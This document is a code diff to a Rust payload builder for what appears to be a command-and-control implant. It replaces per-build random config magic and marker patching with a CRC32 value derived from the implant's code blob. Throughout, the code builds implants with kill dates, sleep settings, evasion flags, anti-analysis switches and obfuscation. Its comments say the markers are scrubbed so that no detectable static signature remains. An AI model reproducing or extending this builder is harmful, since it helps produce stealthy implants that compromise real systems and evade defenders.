@@ -232,8 +232,8 @@ impl PayloadBuilder {
         sleep_config: &SleepConfig,
         kill_date: Option<i64>,
         evasion: EvasionFlags,
-        debug_mode: bool,
-        skip_anti_analysis: bool,
+        _debug_mode: bool,
+        _skip_anti_analysis: bool,
         obfuscation_settings: &ObfuscationSettings,
     ) -> Result<BuildResult, BuilderError> {
         // Get the PIC blob for key derivation (implant derives key from SHA256 of first 64 bytes)
@@ -243,21 +243,13 @@ impl PayloadBuilder {
             .map(|t| t.data.as_slice())
             .unwrap_or(&[]);
 
-        // Generate a per-build random config magic. This replaces the fixed
-        // 0x53504543 ("SPEC") in both the config blob header/AAD and the
-        // implant's patchable cfg_magic_marker region.
-        let config_magic: u32 = {
-            let mut rng = rand::thread_rng();
-            loop {
-                let v: u32 = rand::Rng::gen(&mut rng);
-                if v != 0 && v != DEFAULT_CONFIG_MAGIC {
-                    break v;
-                }
-            }
-        };
+        // Phase 0.4: Derive config magic from CRC32 of the first 64 bytes
+        // of the PIC blob. The implant computes the same CRC32 at runtime,
+        // eliminating the need for the SPECCFGM patchable marker.
+        let config_magic = crc32_config_magic(&pic_blob[..64.min(pic_blob.len())]);
 
-        // Generate config with the per-build magic so the AEAD AAD matches
-        // what the implant will read from its patched cfg_magic_marker region.
+        // Generate config with the derived magic so the AEAD AAD matches
+        // what the implant will compute from CRC32(pic_base[0..64]).
         let gen = generate_config_with_magic(
             profile,
             server_pubkey,
@@ -320,25 +312,11 @@ impl PayloadBuilder {
 
         let mut payload = payload;
 
-        // Patch the per-build config magic into the SPECCFGM marker region
-        // in the PIC blob. The marker is 8 bytes ("SPECCFGM") followed by
-        // 4 bytes where we write the config_magic (LE). The marker itself
-        // is scrubbed later by scrub_markers() in the obfuscation pipeline.
-        const SPECCFGM: &[u8; 8] = b"SPECCFGM";
-        if let Some(marker_pos) = find_marker(&payload, SPECCFGM) {
-            let magic_offset = marker_pos + SPECCFGM.len();
-            if magic_offset + 4 <= payload.len() {
-                payload[magic_offset..magic_offset + 4]
-                    .copy_from_slice(&config_magic.to_le_bytes());
-            }
-        }
+        // Phase 0.4: SPECCFGM marker patching removed — config magic is now
+        // derived from CRC32(pic_blob[0..64]) on both sides.
 
-        // Patch build flags (debug mode, skip anti-analysis) into the PIC blob
-        // via the SPBF marker. This must happen AFTER payload assembly so the
-        // marker is present in the final binary. Always called (even when both
-        // flags are false) to ensure the SPBF marker is scrubbed from the final
-        // payload — otherwise it remains as a detectable static signature.
-        obfuscation::patch_build_flags(&mut payload, debug_mode, skip_anti_analysis);
+        // Phase 0.4: SPBF marker patching removed — build flags are now
+        // controlled by compile-time SPECTER_DEV_BUILD and config TLV 0x8A.
 
         // Phase B: Scrub all remaining SPEC* markers from the final payload.
         // This must happen AFTER config magic patching (SPECCFGM) and build
@@ -526,6 +504,26 @@ impl PayloadBuilder {
 /// Initialize the payload builder (convenience wrapper).
 pub fn builder_init(config: &BuilderConfig) -> Result<PayloadBuilder, BuilderError> {
     PayloadBuilder::new(config)
+}
+
+/// Derive config magic from CRC32 of the PIC blob header (first 64 bytes).
+///
+/// Uses IEEE 802.3 CRC32 (polynomial 0xEDB88320, init 0xFFFFFFFF, final XOR
+/// 0xFFFFFFFF). This is the same algorithm as `evasion_compute_crc()` in the
+/// implant (`implant/core/src/evasion/hooks.c`).
+fn crc32_config_magic(data: &[u8]) -> u32 {
+    let mut crc: u32 = 0xFFFFFFFF;
+    for &byte in data {
+        crc ^= byte as u32;
+        for _ in 0..8 {
+            if crc & 1 != 0 {
+                crc = (crc >> 1) ^ 0xEDB88320;
+            } else {
+                crc >>= 1;
+            }
+        }
+    }
+    crc ^ 0xFFFFFFFF
 }
 
 /// Find a byte marker in a blob.
